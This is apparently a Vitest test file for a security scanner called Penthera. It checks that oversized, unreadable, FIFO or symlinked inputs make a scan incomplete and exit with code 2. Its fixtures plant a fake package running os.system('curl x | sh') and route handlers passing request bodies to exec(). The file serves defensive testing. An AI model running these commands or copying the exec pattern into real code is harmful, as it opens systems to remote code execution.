/**
 * 2.3.2: an input Penthera refuses to read never passes silently.
 * A venv METADATA that is over the cap or unreadable keeps its package
 * (unscanned) and makes the scan incomplete; a route file over the route cap
 * in --repo does the same. Both exit 2.
 *
 * The METADATA and route caps are lowered through a mock of fs-safe, so no
 * test writes a large file.
 */
import { describe, it, expect, vi } from "vitest";
import { mkdtempSync, mkdirSync, writeFileSync, chmodSync, symlinkSync } from "node:fs";
import { execFileSync } from "node:child_process";
import { tmpdir } from "node:os";
import { join } from "node:path";

const CAP = 4096;
vi.mock(import("../lib/fs-safe.js"), async (importOriginal) => {
  const orig = await importOriginal();
  return {
    ...orig,
    // The METADATA cap (16 MiB) and the route cap (5 MiB) are lowered, so no test writes a large file.
    readRepoFile: (p, o = {}) => orig.readRepoFile(p, /(?:METADATA|PKG-INFO|route\.ts)$/.test(String(p)) ? { ...o, maxBytes: CAP } : o),
  };
});

const { scanDeps } = await import("../lib/deps/index.js");
const { scanRepo } = await import("../src/scan-repo.js");
const { exitCodeOf, exitReason } = await import("../src/report/exit.js");
const { mergeResults } = await import("../src/cli/merge-results.js");

const posix = process.platform !== "win32";
const isRoot = process.getuid?.() === 0;
const tmp = (p = "penthera-incomplete-") => mkdtempSync(join(tmpdir(), p));

/** A venv-only project with one normal package and one whose METADATA is replaced by `bad`. */
function venv(bad) {
  const d = tmp();
  const site = join(d, ".venv/lib/python3.12/site-packages");
  mkdirSync(join(site, "good-1.0.dist-info"), { recursive: true });
  mkdirSync(join(site, "good"));
  writeFileSync(join(d, ".venv/pyvenv.cfg"), "home = /usr/bin\n");
  writeFileSync(join(site, "good-1.0.dist-info/METADATA"), "Metadata-Version: 2.1\nName: good\nVersion: 1.0\n");
  writeFileSync(join(site, "good/__init__.py"), "x = 1\n");
  mkdirSync(join(site, "evil_pkg-2.0.dist-info"));
  mkdirSync(join(site, "evil_pkg"));
  writeFileSync(join(site, "evil_pkg/__init__.py"), "import os\nos.system('curl x | sh')\n");
  bad(join(site, "evil_pkg-2.0.dist-info/METADATA"));
  return d;
}
const py = (d) => scanDeps(d, { ecosystem: "python", pipCacheDir: tmp(), uvCacheDir: tmp() });

describe.skipIf(!posix)("a refused venv METADATA keeps the package and exits 2", () => {
  it("an oversized METADATA", async () => {
    const d = venv((p) => writeFileSync(p, `Metadata-Version: 2.1\nName: evil-pkg\nVersion: 2.0\n${"x".repeat(CAP)}\n`));
    const r = await py(d);
    expect(r.deps.packages.map((p) => p.name).sort()).toEqual(["evil-pkg", "good"]);
    expect(r.deps.unscanned).toEqual([expect.objectContaining({ package: "evil-pkg@2.0", reason: expect.stringMatching(/METADATA was not read/) })]);
    expect(r.incomplete).toEqual([expect.objectContaining({ file: expect.stringMatching(/evil_pkg-2\.0\.dist-info\/METADATA$/) })]);
    expect(r.findings.some((f) => f.severity === "info" && /^File not read: .*METADATA$/.test(f.title))).toBe(true);
    expect(exitCodeOf(mergeResults([r]))).toBe(2);
    expect(exitReason(r)).toMatch(/exits 2/);
  });

  it.skipIf(isRoot)("an unreadable METADATA", async () => {
    const d = venv((p) => { writeFileSync(p, "Name: evil-pkg\nVersion: 2.0\n"); chmodSync(p, 0o000); });
    const r = await py(d);
    expect(r.deps.unscanned.map((u) => u.package)).toEqual(["evil-pkg@2.0"]);
    expect(r.incomplete?.length).toBe(1);
    expect(exitCodeOf(r)).toBe(2);
  });

  it("a small valid METADATA behaves as before", async () => {
    const d = venv((p) => writeFileSync(p, "Metadata-Version: 2.1\nName: evil-pkg\nVersion: 2.0\n"));
    const r = await py(d);
    expect(r.incomplete).toBeUndefined();
    expect(r.deps.unscanned).toEqual([]);
    expect(r.deps.scanned).toBe(2);
  });

  it("a .dist-info with no METADATA is still not a distribution", async () => {
    const d = venv(() => {});
    const r = await py(d);
    expect(r.deps.packages.map((p) => p.name)).toEqual(["good"]);
    expect(r.incomplete).toBeUndefined();
  });
});

describe("a route over the route cap makes --repo incomplete", () => {
  it("a padded route with exec(req.body.code) exits 2, keeps the info finding, and survives mergeResults", async () => {
    const d = tmp();
    mkdirSync(join(d, "app/api/run"), { recursive: true });
    writeFileSync(join(d, "package.json"), JSON.stringify({ name: "app", private: true }));
    const code = `import { exec } from "node:child_process";\nexport async function POST(req) {\n  const body = await req.json();\n  exec(body.code);\n  return Response.json({ ok: true });\n}\n`;
    // Past the (lowered) route cap, padded with blank space so nothing else matches.
    writeFileSync(join(d, "app/api/run/route.ts"), `${code}${"\n".repeat(CAP + 1)}`);
    const r = await scanRepo(d);
    expect(r.incomplete).toEqual([{ file: "app/api/run/route.ts", reason: expect.stringMatching(/over the .*limit/) }]);
    expect(r.findings.some((f) => f.severity === "info" && f.title === "File not read: app/api/run/route.ts")).toBe(true);
    expect(exitCodeOf(mergeResults([r]))).toBe(2);
    // Multi-target: incomplete is kept.
    const other = { target: "x", mode: "deps", findings: [] };
    expect(mergeResults([r, other]).incomplete).toEqual(r.incomplete);
    expect(exitCodeOf(mergeResults([r, other]))).toBe(2);
  });

  it.skipIf(!posix)("a FIFO route.ts exits 2 and returns", async () => {
    const d = tmp();
    mkdirSync(join(d, "app/api/run"), { recursive: true });
    mkdirSync(join(d, "app/api/ok"), { recursive: true });
    writeFileSync(join(d, "app/api/ok/route.ts"), "export async function GET() { return Response.json({}); }\n");
    execFileSync("mkfifo", [join(d, "app/api/run/route.ts")]);
    const r = await scanRepo(d);
    expect(r.incomplete).toEqual([expect.objectContaining({ file: "app/api/run/route.ts" })]);
    expect(exitCodeOf(mergeResults([r]))).toBe(2);
  });

  it.skipIf(!posix)("an Express route file linked out of the repo exits 2", async () => {
    const d = tmp();
    const out = tmp();
    writeFileSync(join(out, "evil.js"), "app.post(\"/run\", (req, res) => exec(req.body.code));\n");
    mkdirSync(join(d, "routes"));
    writeFileSync(join(d, "routes/ok.js"), "router.get(\"/ok\", (req, res) => res.send(\"ok\"));\n");
    symlinkSync(join(out, "evil.js"), join(d, "routes/run.js"));
    const r = await scanRepo(d);
    expect(r.incomplete).toEqual([expect.objectContaining({ file: "routes/run.js" })]);
    expect(exitCodeOf(mergeResults([r]))).toBe(2);
  });
});
